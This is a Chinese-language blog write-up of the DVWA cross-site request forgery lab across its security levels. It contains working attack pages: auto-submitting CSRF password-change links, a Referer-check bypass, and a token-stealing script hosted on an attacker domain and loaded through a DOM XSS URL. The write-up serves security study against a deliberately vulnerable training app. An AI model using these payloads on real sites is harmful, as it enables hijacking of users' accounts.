---
layout: post
title: "DVWA Cross Site Request Forgery"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_CSRF
author: ""
tags: ['DVWA', 'CSRF']
---



# DVWA Cross Site Request Forgery

###### tags: `DVWA`



CSRF 特性是自己殺自己

網站通常你想改密碼，會請求發送一個數據包給後端。
攻擊者架一個頁面，功能就是發送此數據包。

1.假設browser登入過 FB 後台有了 session。 browser送出請求會夾帶session
2.你點了惡意網站，你就相當於用你的登入身分 (session) 發出了此情求。

<br/><br/>

# low 

code:
* get 請求
* 只要 pass_new  = pass_conf 就入庫了，沒有判斷。 
```php=
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
```



bp抓包:


```http=
GET /vulnerabilities/csrf/?password_new=1111111111111&password_conf=3333333333333&Change=Change HTTP/1.1
Host: www.dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.dvwa.com/vulnerabilities/csrf/
Cookie: PHPSESSID=qm98fvgpvaostapd4eekcg3oco; security=low
Upgrade-Insecure-Requests: 1



```

拼一下get url
```
http://www.dvwa.com/vulnerabilities/csrf/?password_new=666&password_conf=666&Change=Change
```




* 攻擊者可以在外網搭一個web

這招我看別人用的，但失敗。他是用img 標籤去請求。
圖片發出url 這招在dvwa 1.1 的環境無法成功，但這招可以用在簡單的網站上例無需登入的。

```htmlmixed=
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


<img src="http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change">

</body>
</html>
```


js直接跳轉
```javascript=
<script type="text/javascript">
	
window.location.assign("http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change");

</script>
```


或是直接發link 給受害者只要是那個登入過的瀏覽器去請求的他只要跳轉就可以了。

<br/><br/>





# Medium

* stripos 字串1有沒有找到字串2
判斷refer 找不找的到 www.dvwa.com
注意: www.dvwa.com 是我自己創建的網域

```php=
  if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
```



```http=
GET /vulnerabilities/csrf/?password_new=111111111111&password_conf=22222222222&Change=Change HTTP/1.1
Host: www.dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change
Cookie: PHPSESSID=qm98fvgpvaostapd4eekcg3oco; security=medium
Upgrade-Insecure-Requests: 1


```










假設受害者在 www.hack.com 跳轉了 http://www.dvwa.com/vulnerabilities/csrf/

refer = www.hack.com 所以過不了。


* 解法:
攻擊者只要製造出一個檔名是有 www.dvwa.com 字串的就可以。
<br/>

以下我用了JS 常用的跳轉都失敗，原因是這種refer 都是 www.k.com 並不是完整url

http://www.k.com/www.dvwa.com.html
```htmlembedded=
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

</body>



<script type="text/javascript">
	
/*
window.location.assign("http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change");

*/

/*
window.location.href = "http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change";
*/
</script>

</html>


```

<br/><br/>


改成 a tag 然後 JS 觸發點擊

* a tag
加上referrerpolicy="unsafe-url" 可以refer 完整url

可以自動跳轉並且成功
http://www.k.com/www.dvwa.com.html
```htmlembedded=
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


<a  id="demo" href="http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change" referrerpolicy="unsafe-url">click me</a>
</body>




<script type="text/javascript">


	function run(){
	    document.getElementById("demo").click();
	}

	run();

</script>




</html>
```

小疑問:
```
document.getElementById("demo").click();
為啥一定要包在 run() 裡面才能成功，
該不會是 callback 之類的....
```




<br/><br/>

# High


code:
* 加上了 token 


```php=
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
```



也就是說，前面的攻擊者只需要發送請求。但這次還須要猜測出 token。

幾本上攻擊者因為是沒登入狀態下，所以拿不到登入狀態下的token，所以可以防禦。

但這題需要使用 xss + csrf


受害者網站上具有xss 
* 我們這題使用 xss dom level: high


* 攻擊者在外網架設一個惡意腳本:
xss 執行抓取token -> xss 發出更改密碼請求

<br/><br/>

知道了以上步驟後，我們先在dvwa 目錄下本地測試一個檔案，


* 測試能不能透過這支腳本達到csrf的效果。
實測可以fetch 請求達到 csrf 改變密碼為777

http://www.dvwa.com/csrf_high.html


```javascript=

<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

	<h1>hack</h1>

</body>

<script type="text/javascript">
	

async function getToken(url) {

 	let data = await fetch(url);

 	// data 轉為 text
 	data = await data.text();

 	//創造dom 物件
	const parser = new DOMParser();

	//把resoonse資料轉成dom
	const htmlDoc =  parser.parseFromString(data, "text/html");


	//querySelector 抓取 token 
	let token =  htmlDoc.querySelector("input[name=user_token]").value; 

	//回傳token
	return token;

}






async function csrf_send() {

	//拿token
	let url = "http://www.dvwa.com/vulnerabilities/csrf/";
    
	let token =  await getToken(url);

        //csrf 
	csrf_url_Request = "http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change&user_token="

	//加上token 
	csrf_url_Request += token;

	//console.log(csrf_request) ;
	
        //fetch 發出請求
	fetch(csrf_url_Request);

}


csrf_send();



</script>

</html>

```

<br/><br/>



測試csrf沒問題後，把JS code拿出來放在外網

我這邊為www.k.com/hack.js

```javascript=
async function getToken(url) {

 	let data = await fetch(url);

 	// data 轉為 text
 	data = await data.text();

 	//創造dom 物件
	const parser = new DOMParser();

	//把resoonse資料轉成dom
	const htmlDoc =  parser.parseFromString(data, "text/html");


	//querySelector 抓取 token 
	let token =  htmlDoc.querySelector("input[name=user_token]").value; 

	//回傳token
	return token;

}






async function csrf_send() {

	//拿token
	let url = "http://www.dvwa.com/vulnerabilities/csrf/";
    
	let token =  await getToken(url);

        //csrf 
	csrf_url_Request = "http://www.dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change&user_token="

	//加上token 
	csrf_url_Request += token;

	//console.log(csrf_request) ;
	
        //fetch 發出請求
	fetch(csrf_url_Request);

}


csrf_send();
```

dom xss level:high 的頁面有xss漏洞。xss載入遠端腳本。

發給受害者

```
http://www.dvwa.com/vulnerabilities/xss_d/?default=#<script src="http://www.k.com/hack.js"</script>
```


模擬:

受害者登入dvwa --> 後收到了來自 hacker給的link --> 點擊就會進入xss dom high 的頁面

--> 這個頁面是有xss的，所以載入了外部hack.js --> 這個hack.js 會先拿到token 在改變密碼。



<br/><br/>


# Impossible



code:
* 多了一個 password_current 也就是目前密碼
也就是說hacker 不能在無腦偽造了，因為就算xss 拿到了token 我們也不知道當前使用者的密碼。
```php=
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

```

無解。



<br/><br/><br/><br/>




























